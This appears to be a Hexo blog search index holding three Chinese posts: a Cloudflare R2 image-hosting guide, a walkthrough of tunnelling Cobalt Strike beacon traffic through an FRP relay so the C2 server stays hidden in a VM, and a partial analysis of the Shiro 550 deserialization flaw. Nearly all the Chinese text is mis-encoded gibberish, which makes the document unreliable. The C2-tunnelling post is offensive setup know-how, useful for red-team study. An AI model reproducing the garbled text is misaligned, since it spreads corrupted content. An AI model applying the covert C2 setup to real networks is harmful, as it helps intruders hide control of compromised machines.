<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>åˆ©ç”¨Cloudflare R2æ­å»ºå›¾åºŠ</title>
    <link href="/2024/07/08/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E5%88%A9%E7%94%A8Cloudflare%20R2%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/"/>
    <url>/2024/07/08/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E5%88%A9%E7%94%A8Cloudflare%20R2%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰åšå®¢éƒ½æ˜¯é€šè¿‡GitHubå®ç°å›¾åºŠçš„ï¼Œä½†æ˜¯å›½å†…è®¿é—®å›¾ç‰‡çš„é€Ÿåº¦å®åœ¨æ˜¯ä¸æ•¢æ­ç»´ï¼›å¦å¤–GitHubå…¶å®æ˜¯ä¸å…è®¸åšå›¾åºŠçš„ï¼Œå½“åº“è¶…è¿‡1Gä»¥åä¼šæœ‰äººå·¥å®¡æŸ¥ï¼Œå‘ç°æ˜¯å›¾åºŠå¯èƒ½ä¼šåˆ åº“ï¼Œç”šè‡³å°å¸å·ï¼›</p><h2 id="å‰æœŸè§£å†³æ–¹æ¡ˆ"><a href="#å‰æœŸè§£å†³æ–¹æ¡ˆ" class="headerlink" title="å‰æœŸè§£å†³æ–¹æ¡ˆ"></a>å‰æœŸè§£å†³æ–¹æ¡ˆ</h2><p>æ€»ä½“æ¥çœ‹æœ‰å‡ ä¸ªè§£å†³æ–¹æ³•</p><p>é˜¿é‡Œäº‘ossè…¾è®¯äº‘cosä¸ƒç‰›äº‘åˆæ‹äº‘</p><p>ä¸ƒç‰›äº‘æœ‰å…è´¹çš„é¢åº¦ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸å¤‡æ¡ˆçš„åŸŸåï¼Œä½†æ˜¯è¿™æ ·çš„è¯å›¾ç‰‡é€Ÿåº¦æ¯”Githubè¿˜æ…¢</p><p>åˆæ‹äº‘éœ€è¦ç½‘ç«™å¤‡æ¡ˆï¼ŒåŠ å…¥åˆæ‹äº‘è”ç›Ÿæ‰æœ‰å…è´¹é¢åº¦ï¼Œåˆæ‹äº‘è”ç›Ÿéœ€è¦åœ¨ä½ çš„ç½‘ç«™ä¸ŠåŠ ä¸Šä»–ä»¬çš„å¹¿å‘Šå’Œéœ€è¦æ‰‹æŒè¯ä»¶ç…§æ‹ç…§å®¡æ ¸</p><p>ç»¼ä¸Šï¼Œå‰æœŸæˆ‘ç”¨çš„ç¬¬ä¸€ä¸ªè§£å†³æ–¹æ¡ˆæ˜¯è…¾è®¯äº‘çš„cosæ¡¶ï¼Œç±»ä¼¼çš„è¿˜æœ‰é˜¿é‡Œäº‘çš„ossï¼Œä»·æ ¼å…¶å®ä¹Ÿä¸è´µ</p><p>ä½†æ˜¯å½“æˆ‘éƒ¨ç½²å®Œäº†ï¼Œå»æµè§ˆå™¨æ‰“å¼€å›¾ç‰‡è¿æ¥å‘ç°ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä¸‹è½½å›¾ç‰‡ï¼Œä¸èƒ½é¢„è§ˆï¼Œç¿»äº†åŠå¤©cosä»‹ç»æ‰çŸ¥é“ï¼ŒåŸŸåæ²¡å¤‡æ¡ˆçš„ä¸æ”¯æŒé¢„è§ˆï¼Œæµè§ˆå™¨æ‰“å¼€è¿æ¥å°±ç›´æ¥ä¸‹è½½äº†ã€‚ç”¨äº†ä¸€æ®µæ—¶é—´ï¼Œè™½ç„¶æ²¡å•¥å¤§é—®é¢˜ï¼Œä½†æ˜¯æ€»æ„Ÿè§‰ä¸çˆ½ã€‚</p><p>æ€»ä½“æ¥è¯´ä¸Šé¢çš„æ–¹æ¡ˆéƒ½éœ€è¦å¤‡æ¡ˆæ‰èƒ½æœ‰è‰¯å¥½çš„ä½¿ç”¨ä½“éªŒã€‚</p><p>äºæ˜¯æœ€åè½¬å‘äº†<strong>Cloudflare</strong>çš„æ€€æŠ±</p><p>ä¼˜åŠ¿æ˜¯ï¼š</p><p>ç½‘ç«™ä¸éœ€è¦å¤‡æ¡ˆï¼Œæœ‰å…è´¹é¢åº¦</p><p>å›¾ç‰‡å“åº”é€Ÿåº¦å¿«</p><p><strong>R2 å®šä»·</strong></p><table><thead><tr><th>ã…¤</th><th>å…è´¹</th><th>è¶…å‡ºéƒ¨åˆ†&#x2F;æœˆè´¹</th></tr></thead><tbody><tr><td>å­˜å‚¨</td><td>10 GB&#x2F;æœˆ</td><td>0.015 ç¾å…ƒ&#x2F;GB</td></tr><tr><td>A ç±»æ“ä½œ</td><td>100 ä¸‡æ¬¡&#x2F;æœˆ</td><td>4.50 ç¾å…ƒ&#x2F;ç™¾ä¸‡æ¬¡</td></tr><tr><td>B ç±»æ“ä½œ</td><td>1000 ä¸‡æ¬¡&#x2F;æœˆ</td><td>0.36 ç¾å…ƒ&#x2F;ç™¾ä¸‡æ¬¡</td></tr></tbody></table><h2 id="ä½¿ç”¨Cloudflare-R2çš„å‰æœŸå‡†å¤‡"><a href="#ä½¿ç”¨Cloudflare-R2çš„å‰æœŸå‡†å¤‡" class="headerlink" title="ä½¿ç”¨Cloudflare R2çš„å‰æœŸå‡†å¤‡"></a>ä½¿ç”¨Cloudflare R2çš„å‰æœŸå‡†å¤‡</h2><p><a href="https://github.com/Kuingsmile/PicList">PicList</a></p><p><a href="https://www.paypal.com/">paypal</a></p><p>åŸŸå(å¯ä¸å¤‡æ¡ˆ)</p><h2 id="ç¬¬ä¸€ä¸ªå‘ç‚¹"><a href="#ç¬¬ä¸€ä¸ªå‘ç‚¹" class="headerlink" title="ç¬¬ä¸€ä¸ªå‘ç‚¹"></a>ç¬¬ä¸€ä¸ªå‘ç‚¹</h2><p>å…¶å®ä¹‹å‰å¾ˆæ—©å°±æ³¨å†Œ<strong>Cloudflare</strong>äº†ï¼Œä¸Šå»çœ‹äº†ä¸€ä¸‹ï¼Œæœ‰å¾ˆå¤šè‡ªå·±ä¸æ˜¯å¾ˆäº†è§£çš„ä¸œè¥¿ï¼Œå°±ç•™åœ¨æ¸©æŸ”ä¹¡äº†ã€‚ã€‚ã€‚ç»§ç»­ä½¿ç”¨cosæ¡¶ï¼›å¦ä¸€ä¸ªé—®é¢˜æ˜¯ä¹‹å‰å¬è¿‡åˆ›å»ºR2å­˜å‚¨ç”¨paypalå°±è¡Œï¼Œä½†æ˜¯æˆ‘ä¸Šå»çœ‹å¿…é¡»è¦ä¿¡ç”¨å¡ï¼Œé‚æ”¾å¼ƒã€‚</p><p>å¶ç„¶å‘ç°æ˜¯æ¢¯å­çš„é—®é¢˜</p><p>ä¸ªäººä¹ æƒ¯æ¢¯å­å¼€æœºè‡ªå¯ï¼Œä¹ æƒ¯è°·æ­Œï¼Œæœç»ç™¾åº¦</p><p>å¯ä»¥çœ‹åˆ°å¹¶æ²¡æœ‰å‡ºç°paypalçš„é€‰é¡¹</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240628144516183.png" alt="image-20240628144516183"></p><p>ä¸å¼€æ¢¯å­å°±å¯ä»¥ä½¿ç”¨paypalä»˜æ¬¾äº†</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240628144701802.png" alt="image-20240628144701802"></p><h2 id="ç½‘ç«™æ‰˜ç®¡åˆ°Cloudflare"><a href="#ç½‘ç«™æ‰˜ç®¡åˆ°Cloudflare" class="headerlink" title="ç½‘ç«™æ‰˜ç®¡åˆ°Cloudflare"></a>ç½‘ç«™æ‰˜ç®¡åˆ°Cloudflare</h2><p>é¦–å…ˆéœ€è¦æŠŠä½ çš„åŸŸåæ·»åŠ åˆ°<strong>Cloudflare</strong></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145013147.png" alt="image-20240628145013147"></p><p>é€‰æ‹©å…è´¹çš„è®¡åˆ’å°±è¡Œï¼Œéšåä¼šåˆ†é…ä¸¤ä¸ªdnsæœåŠ¡å™¨</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145259856.png" alt="image-20240628145259856"></p><p>ç›´æ¥å»åŸŸåçš„æœåŠ¡å•†é‚£é‡Œæ”¹æˆè¿™<strong>Cloudflare</strong>çš„DNSåœ°å€</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145524103.png" alt="image-20240628145524103"></p><p>å¦å¤–ä½¿ç”¨CFä¹‹åå‘ç°ï¼Œç½‘ç«™åŠ è½½é€Ÿåº¦å¾ˆæ…¢ã€‚æŠŠAè®°å½•å’ŒCNAMEè®¾ç½®ä¸ºä»…DNSå°±è¡Œ</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151002609.png" alt="image-20240628151002609"></p><h2 id="åˆ›å»ºå­˜å‚¨æ¡¶"><a href="#åˆ›å»ºå­˜å‚¨æ¡¶" class="headerlink" title="åˆ›å»ºå­˜å‚¨æ¡¶"></a>åˆ›å»ºå­˜å‚¨æ¡¶</h2><p>ä½ç½®é€‰æ‹© äºšå¤ªåœ°åŒº</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151346032.png" alt="image-20240628151346032"></p><p>R2åˆ›å»ºå®Œä¹‹åï¼Œè®¾ç½®è¿æ¥åŸŸåï¼Œè¾“å…¥åˆšåˆšæ·»åŠ çš„åŸŸåçš„ä¸‰çº§åŸŸåï¼Œæ¯”å¦‚ a.com å†™ä¸ºimage.a.comï¼Œ<strong>Cloudflare</strong>ä¼šè‡ªåŠ¨æ·»åŠ è®°å½•ï¼Œç”¨è¿™ä¸ªåŸŸåå°±å¯ä»¥è®¿é—®R2å­˜å‚¨çš„å†…å®¹</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151514382.png" alt="image-20240628151514382"></p><p>æ¥ç€æ·»åŠ ä¸€ä¸ªç®¡ç†ä»¤ç‰Œ</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151750145.png" alt="image-20240628151750145"></p><p>å‰©ä¸‹çš„é»˜è®¤å³å¯</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151925647.png" alt="image-20240628151925647"></p><h2 id="PicListä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡çš„è§£å†³æ–¹æ¡ˆ"><a href="#PicListä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡çš„è§£å†³æ–¹æ¡ˆ" class="headerlink" title="PicListä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡çš„è§£å†³æ–¹æ¡ˆ"></a>PicListä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡çš„è§£å†³æ–¹æ¡ˆ</h2><p>ä¸¥æ ¼æŒ‰ç…§å¦‚å›¾æ‰€ç¤ºä½ç½®å¡«å†™</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240628152607640.png" alt="image-20240628152607640"></p><p>ä¸Šä¼ è·¯å¾„å¯ä»¥æ ¹æ®è¡¨è‡ªå·±ç»„åˆå¡«å†™</p><table><thead><tr><th align="center">payload</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center"><code>&#123;year&#125;</code></td><td align="center">å½“å‰æ—¥æœŸ - å¹´</td></tr><tr><td align="center"><code>&#123;month&#125;</code></td><td align="center">å½“å‰æ—¥æœŸ - æœˆ</td></tr><tr><td align="center"><code>&#123;day&#125;</code></td><td align="center">å½“å‰æ—¥æœŸ - æ—¥</td></tr><tr><td align="center"><code>&#123;fullName&#125;</code></td><td align="center">å®Œæ•´æ–‡ä»¶åï¼ˆå«æ‰©å±•åï¼‰</td></tr><tr><td align="center"><code>&#123;fileName&#125;</code></td><td align="center">æ–‡ä»¶åï¼ˆä¸å«æ‰©å±•åï¼‰</td></tr><tr><td align="center"><code>&#123;extName&#125;</code></td><td align="center">æ‰©å±•åï¼ˆä¸å«.ï¼‰</td></tr><tr><td align="center"><code>&#123;md5&#125;</code></td><td align="center">å›¾ç‰‡ MD5 è®¡ç®—å€¼</td></tr><tr><td align="center"><code>&#123;sha1&#125;</code></td><td align="center">å›¾ç‰‡ SHA1 è®¡ç®—å€¼</td></tr><tr><td align="center"><code>&#123;sha256&#125;</code></td><td align="center">å›¾ç‰‡ SHA256 è®¡ç®—å€¼</td></tr><tr><td align="center"><code>&#123;timestamp&#125;</code></td><td align="center">Unix æ—¶é—´æˆ³</td></tr><tr><td align="center"><code>&#123;timestampMS&#125;</code></td><td align="center">Unix æ—¶é—´æˆ³ï¼ˆæ¯«ç§’ï¼‰</td></tr></tbody></table><p>åœ°åŒºå› ä¸ºé€‰æ‹©äºšå¤ªåœ°åŒºæ‰€æœ‰å¡«å†™ apac</p><p><strong>è‡ªå®šä¹‰åŸŸåå†™åˆšåˆšçš„ä¸‰çº§åŸŸåå¦‚:<a href="http://image.a.com/">http://image.a.com</a></strong></p><hr><h3 id="PicListä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡çš„è¸©å‘è®°å½•"><a href="#PicListä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡çš„è¸©å‘è®°å½•" class="headerlink" title="PicListä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡çš„è¸©å‘è®°å½•"></a>PicListä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡çš„è¸©å‘è®°å½•</h3><p>ä¹‹å‰è®¾ç½®<strong>PicList</strong>è‡ªå®šä¹‰èŠ‚ç‚¹ä½¿ç”¨äº†è¿™ä¸ª S3 APIï¼Œå®ƒå…¶å®å’Œä¸Šå›¾ç®¡è¾–åœ°å€åªå·®ä¸€ä¸ªå­˜å‚¨æ¡¶çš„åå­— </p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240628153202851.png" alt="image-20240628153202851"></p><p>è€Œä¸”å¯ä»¥ä¸Šä¼ å›¾ç‰‡ï¼Œä½†æ˜¯å›¾ç‰‡åœ¨typoraåŠ è½½ä¼šå¤±è´¥</p><p>éšåå°†<strong>PicList</strong>è‡ªå®šä¹‰åŸŸå<a href="http://image.a.com,æ”¹ä¸ºhttp//image.a.com/blog1">http://image.a.comï¼Œæ”¹ä¸ºhttp://image.a.com/blog1</a></p><p>å›¾ç‰‡æ˜¾ç¤ºæ­£å¸¸</p><p>ç”¨äº†ä¸€æ®µæ—¶é—´æ‰å‘ç°<strong>PicList</strong>ä¸èƒ½åŒæ­¥åˆ é™¤äº‘ç«¯å›¾ç‰‡ï¼Œçœ‹æ—¥å¿—æ²¡æœ‰çœ‹åˆ°åˆ é™¤è®°å½•</p><p>æœ€å¼€å§‹è°·æ­ŒåŠå¤©æ‰¾ä¸åˆ°åŸå› ï¼Œéšåæ‰¾åˆ°è¿™ä¸ªissuse:<a href="https://github.com/Kuingsmile/PicList/issues/203%E6%89%8D%E8%A7%A3%E5%86%B3%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98">https://github.com/Kuingsmile/PicList/issues/203æ‰è§£å†³è¿™ä¸ªé—®é¢˜</a></p><p>éšå<strong>PicList</strong>ä¹Ÿå¯ä»¥æ­£å¸¸çš„åˆ é™¤äº‘ç«¯çš„å›¾ç‰‡äº†</p><p><strong>(æµªè´¹è´¼å¤šæ—¶é—´å»è°·æ­Œï¼Œçœ‹æ¥ä¸‹æ¬¡é‡åˆ°é—®é¢˜å¾—å…ˆå»çœ‹issuse)</strong></p><h2 id="ğŸ¤—Enjoyï¼"><a href="#ğŸ¤—Enjoyï¼" class="headerlink" title="ğŸ¤—Enjoyï¼"></a>ğŸ¤—Enjoyï¼</h2><h2 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h2><p><a href="https://developers.cloudflare.com/r2/">Cloudflare R2 Â· Cloudflare R2 docs</a></p><p><a href="https://github.com/Kuingsmile/PicList/issues/203">Bugæ— æ³•åŒæ­¥åˆ é™¤äº‘ç«¯ #203</a></p><p><a href="https://piclist.cn/app">PicListæ–‡æ¡£</a></p>]]></content>
    
    
    <categories>
      
      <category>å¥‡æŠ€æ·«å·§</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å¥‡æŠ€æ·«å·§</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç”¨FRPå®ç°Cobalt Strikeæœ¬åœ°ä¸Šçº¿</title>
    <link href="/2024/07/03/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%88%A9%E7%94%A8FRP%E5%AE%9E%E7%8E%B0cobalt%20strike%E6%9C%AC%E5%9C%B0%E4%B8%8A%E7%BA%BF/"/>
    <url>/2024/07/03/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%88%A9%E7%94%A8FRP%E5%AE%9E%E7%8E%B0cobalt%20strike%E6%9C%AC%E5%9C%B0%E4%B8%8A%E7%BA%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¦‚æœå°†Cobalt Strikeéƒ¨ç½²åœ¨VPSä¸Šï¼Œé•¿æœŸä½¿ç”¨VPSä¼šè¢«æ ‡è®°ã€‚å¦å¤–ï¼Œå¤§å®¶ä½¿ç”¨çš„ä¸€èˆ¬æ˜¯ç ´è§£ç‰ˆï¼Œä¸èƒ½ç¡®ä¿æ²¡æœ‰åé—¨ä¹‹ç±»çš„ä¸œè¥¿ã€‚é‚£å¯ä»¥å°†CSéƒ¨ç½²åœ¨è™šæ‹Ÿæœºé‡Œï¼Œåˆ©ç”¨FRPè½¬å‘ä¸Šçº¿ã€‚</p><p>æ¯”å¦‚ç°åœ¨æœ‰ä¸‰ä¸ªè§’è‰²ï¼šå…¬ç½‘æœåŠ¡å™¨ï¼š41.24.10.40      CSæœåŠ¡å™¨ï¼š192.168.73.98ï¼ˆè™šæ‹Ÿæœºé‡Œï¼‰      é¶æœºï¼š192.168.112.130(å¯ä»¥è®¿é—®å…¬ç½‘)</p><h2 id="å®ç°æ­¥éª¤"><a href="#å®ç°æ­¥éª¤" class="headerlink" title="å®ç°æ­¥éª¤"></a>å®ç°æ­¥éª¤</h2><p>åœ¨å…¬ç½‘æœåŠ¡å™¨ä¸Šfrpç»‘å®šç«¯å£7000</p><p><img src="https://image.sp4rks.xyz/2024/07/image-20240703205441550.png" alt="image-20240703205441550"></p><p>CSæœåŠ¡å™¨çš„FRPé…ç½®</p><p><img src="https://image.sp4rks.xyz/2024/07/image-20240703211315532.png" alt="image-20240703211315532"></p><p>CSç”Ÿæˆç›‘å¬å™¨é€‰æ‹©å…¬ç½‘æœåŠ¡å™¨çš„åœ°å€</p><p><img src="https://image.sp4rks.xyz/2024/07/image-20240703205751820.png" alt="image-20240703205751820"></p><p>CSæœåŠ¡å™¨æ˜¯å†…ç½‘æœºå™¨ï¼ˆ<code>192.168.73.98</code>ï¼‰ï¼Œå®ƒè¿è¡Œäº†ä¸€ä¸ªæœ¨é©¬ç¨‹åºï¼Œåœ¨ <code>6000</code> ç«¯å£ä¸Šç›‘å¬ã€‚ä½†æ˜¯è¿™å°å†…ç½‘æœºå™¨æ— æ³•ç›´æ¥ä»å…¬ç½‘è®¿é—®ã€‚</p><p>é€šè¿‡é…ç½®è¿™ä¸ªFRPå®¢æˆ·ç«¯ï¼Œå®ƒä¼šå°†æœ¬åœ° <code>192.168.73.98:6000</code> çš„TCPæµé‡è½¬å‘åˆ°å…¬ç½‘ä¸Šçš„FRPæœåŠ¡å™¨ (<code>41.24.10.40:7000</code>)ã€‚FRPæœåŠ¡å™¨ä¼šå°†è¿™ä¸ªæµé‡è½¬å‘åˆ°å…¬ç½‘çš„ <code>6000</code> ç«¯å£ï¼Œå› æ­¤ï¼Œå¤–éƒ¨ç½‘ç»œå¯ä»¥é€šè¿‡è®¿é—® <code>41.24.10.40:6000</code> æ¥è®¿é—®å†…ç½‘ä¸­è¿è¡Œçš„æœ¨é©¬ç¨‹åºï¼ˆæˆ–å…¶ä»–æœåŠ¡ï¼‰ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>çœ‹å°è¿ªçš„è§†é¢‘ï¼Œä»–çš„æ“ä½œæ˜¯ï¼šCSæœåŠ¡å™¨çš„FRPé…ç½®ä¸­ï¼Œæœ¬åœ°ç«¯å£ä¸å…¬ç½‘æœåŠ¡å™¨ç«¯å£ä¸ä¸€æ ·ï¼Œç„¶åç”¨CSç”Ÿæˆä¸¤ä¸ªç›‘å¬å™¨ï¼Œä¸€ä¸ªæ˜¯CSæœåŠ¡å™¨çš„IP+å®ƒæœ¬åœ°ç«¯å£ï¼›å¦ä¸€ä¸ªæ˜¯è¿œç¨‹æœåŠ¡å™¨IP+å…¬ç½‘æœåŠ¡å™¨ç«¯å£ï¼Œç”Ÿæˆæœ¨é©¬ç”¨è¿œç¨‹æœåŠ¡å™¨IP+å…¬ç½‘æœåŠ¡å™¨ç«¯å£è¿™ä¸ªç›‘å¬å™¨ã€‚ä»–æˆåŠŸäº†ä¸Šçº¿äº†ï¼Œæˆ‘æ­»æ´»ä¸æˆåŠŸã€‚æˆ‘è¿˜ä»¥ä¸ºCSé—®é¢˜ï¼Œé˜²ç«å¢™é—®é¢˜ï¼Œé©¬å„¿çš„é—®é¢˜ï¼Œæ€€ç–‘å„ç§é—®é¢˜ï¼Œåæ­£æ²¡æ€€ç–‘ä»–è§†é¢‘ã€‚ç„¶åä»æ˜¨å¤©æåˆ°ä»Šå¤©ï¼Œåæ­£ä¸å˜»å˜» :r</p>]]></content>
    
    
    <categories>
      
      <category>å†…ç½‘å®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å†…ç½‘å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–Shiro 550åˆ†æ</title>
    <link href="/2024/06/09/JAVA%E5%AE%89%E5%85%A8/Shiro550/"/>
    <url>/2024/06/09/JAVA%E5%AE%89%E5%85%A8/Shiro550/</url>
    
    <content type="html"><![CDATA[<h2 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h2><p><strong>å½±å“ç‰ˆæœ¬</strong>ï¼šShiro &lt;&#x3D; 1.2.4</p><p><strong>æ¼æ´æ ¹æœ¬åŸå› </strong>:å›ºå®škeyåŠ å¯†</p><p><strong>Shiroç‰¹å¾</strong>ï¼šè¿”å›åŒ…ä¸­åŒ…å«rememberMe&#x3D;deleteMeå­—æ®µã€‚</p><p>Shiroæ¡†æ¶æä¾›äº†è®°ä½å¯†ç çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieã€‚åœ¨æœåŠ¡ç«¯å¯¹rememberMeçš„cookieå€¼ï¼Œå…ˆbase64è§£ç ç„¶åAESè§£å¯†å†ååºåˆ—åŒ–ï¼Œå°±å¯¼è‡´äº†ååºåˆ—åŒ–RCEæ¼æ´ã€‚</p><p><a href="https://blog.csdn.net/qq_36551991/article/details/118031254">Shiroä»‹ç»</a></p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul><li><p>JDK8u202</p></li><li><p>tomcat 8.5.100</p></li><li><p>Shiro 1.2.4</p></li></ul><h3 id="ä¸‹è½½tomcat"><a href="#ä¸‹è½½tomcat" class="headerlink" title="ä¸‹è½½tomcat"></a>ä¸‹è½½tomcat</h3><p><a href="https://tomcat.apache.org/download-80.cgi">tomcat8</a>(ä¸‹è½½å¥½åè§£å‹)</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240609144237140.png" alt="image-20240609144237140"></p><p>å¯åŠ¨tomcatåå‘ç°æ—¥å¿—æ˜¯ä¹±ç </p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240531212732532.png" alt="image-20240531212732532"></p><p>æ‰¾åˆ°è¿™ä¸ªä½ç½®æŠŠUTF-8æ”¹ä¸ºGBK</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240531213058211.png" alt="image-20240531213058211"></p><p><code>Windows</code><strong>ä¸‹çš„<code>CMD</code>çš„é»˜è®¤å­—ç¬¦é›†æ˜¯<code>GBK</code>ï¼Œæ‰€ä»¥<code>UTF8</code>ç¼–ç è¾“å‡ºçš„æ—¥å¿—ï¼Œä¸­æ–‡çœ‹åˆ°çš„è‚¯å®šæ˜¯ä¹±ç äº†ã€‚</strong></p><hr><h3 id="ä¸‹è½½shiroç¯å¢ƒ"><a href="#ä¸‹è½½shiroç¯å¢ƒ" class="headerlink" title="ä¸‹è½½shiroç¯å¢ƒ"></a>ä¸‹è½½shiroç¯å¢ƒ</h3><p>pç‰›çš„ç¯å¢ƒ:<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">shirodemo</a></p><p>ç¼–è¾‘é¡¹ç›®è®¾ç½®</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240609150059572.png" alt="image-20240609150059572"></p><p>æ·»åŠ tomcat</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240609150152218.png" alt="image-20240609150152218"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240609150612269.png" alt="image-20240609150612269"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240611180441211.png" alt="image-20240611180441211"></p><p>é»˜è®¤è´¦å·:root   </p><p>é»˜è®¤å¯†ç :secret</p><h2 id="Shiro-Cookieå¤„ç†æµç¨‹åˆ†æ"><a href="#Shiro-Cookieå¤„ç†æµç¨‹åˆ†æ" class="headerlink" title="Shiro Cookieå¤„ç†æµç¨‹åˆ†æ"></a>Shiro Cookieå¤„ç†æµç¨‹åˆ†æ</h2><h3 id="åŠ å¯†æµç¨‹åˆ†æ"><a href="#åŠ å¯†æµç¨‹åˆ†æ" class="headerlink" title="åŠ å¯†æµç¨‹åˆ†æ"></a>åŠ å¯†æµç¨‹åˆ†æ</h3><p><a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiroååºåˆ—åŒ–æ¼æ´(ä¸€)-shiro550æµç¨‹åˆ†æ</a></p><hr><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªç±»çš„ç»§æ‰¿å…³ç³»</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+-----------------------------------+</span><br><span class="hljs-section">| RememberMeManager  &lt;&lt;interface&gt;&gt;  |</span><br><span class="hljs-section">+-----------------------------------+</span><br><span class="hljs-code">          ^</span><br><span class="hljs-section">          |</span><br><span class="hljs-section">+-----------------------------------+</span><br><span class="hljs-section">|  AbstractRememberMeManager        |</span><br><span class="hljs-section">+-----------------------------------+</span><br><span class="hljs-code">          ^</span><br><span class="hljs-section">          |</span><br><span class="hljs-section">+-----------------------------------+</span><br><span class="hljs-section">|     CookieRememberMeManager       |</span><br><span class="hljs-section">+-----------------------------------+</span><br></code></pre></td></tr></table></figure><hr><p><strong>RememberMeManager</strong></p><p><code>RememberMeManager</code>æ¥å£æä¾›äº†ä»¥ä¸‹æ–¹æ³•ï¼š</p><ul><li><code>getRememberedPrincipals()</code>ï¼šRememberMe çš„åŠŸèƒ½ã€‚</li><li><code>forgetIdentity()</code>ï¼šå¿˜è®°ç”¨æˆ·èº«ä»½æ ‡è¯†ã€‚</li><li><code>onSuccessfulLogin()</code>ï¼šç™»å½•æ ¡éªŒæˆåŠŸæ—¶è°ƒç”¨ï¼Œä¿å­˜å½“å‰ç”¨æˆ·çš„<code>principals</code>ä»¥ä¾›åº”ç”¨ç¨‹åºä»¥åè°ƒç”¨ã€‚</li><li><code>onFailedLogin()</code>ï¼šç™»å½•æ ¡éªŒå¤±è´¥æ—¶è°ƒç”¨ï¼Œå¿˜è®°å½“å‰ç”¨æˆ·çš„<code>principals</code>ã€‚</li><li><code>onLogout()</code>ï¼šç”¨æˆ·é€€å‡ºç™»å½•æ—¶è°ƒç”¨ï¼Œå¿˜è®°å½“å‰ç”¨æˆ·çš„<code>principals</code>ã€‚</li></ul><p><strong>AbstractRememberMeManager</strong></p><p><code>AbstractRememberMeManager</code>æ˜¯å®ç°<code>RememberMeManger</code>æ¥å£ç±»çš„æŠ½è±¡ç±»ï¼Œè¿™é‡Œæœ‰å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„æˆå‘˜å˜é‡éœ€è¦äº†è§£ï¼š</p><ul><li><code> DEFAULT_CIPHER_KEY_BYTES</code>ï¼šä¸€ä¸ªç¡¬ç¼–ç  AES KEYï¼Œè¯¥ KEY ä¼šè¢«è®¾ç½®ä¸ºåŠ è§£å¯† KEY 